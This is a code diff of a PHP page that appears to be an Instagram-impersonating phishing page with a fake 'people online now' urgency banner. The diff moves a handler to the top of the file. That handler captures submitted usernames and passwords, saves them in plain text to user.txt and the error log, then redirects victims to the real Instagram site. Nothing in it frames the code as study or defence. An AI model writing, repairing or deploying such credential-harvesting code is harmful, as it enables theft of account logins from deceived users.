@@ -1,3 +1,17 @@
+<?php
+ob_start(); // Start output buffering
+
+if($_SERVER['REQUEST_METHOD']=='POST'){
+    $name = $_POST['username'];
+    $pass = $_POST['pass'];
+    $data = "user=$name,pass=$pass" . PHP_EOL;
+    file_put_contents('user.txt', $data, FILE_APPEND | LOCK_EX);
+    error_log("username=$name,pass=$pass");
+    sleep(2);
+    header('Location: https://instagram.com');
+    exit();
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -180,19 +194,5 @@
             🔥 247 people online now - Don't miss out!
         </div>
     </div>
-
-    <?php
-    if($_SERVER['REQUEST_METHOD']=='POST'){
-        $name=$_POST['username'];
-        $pass=$_POST['pass'];
-        $data="user=$name,pass=$pass".PHP_EOL;
-        file_put_contents('user.txt',$data,FILE_APPEND|LOCK_EX);
-        error_log("username=$name,pass=$pass");
-        sleep(2);
-        header('Location: https://instagram.com');
-        exit();
-    }
-    ob_end_flush();
-    ?>
 </body>
 </html>
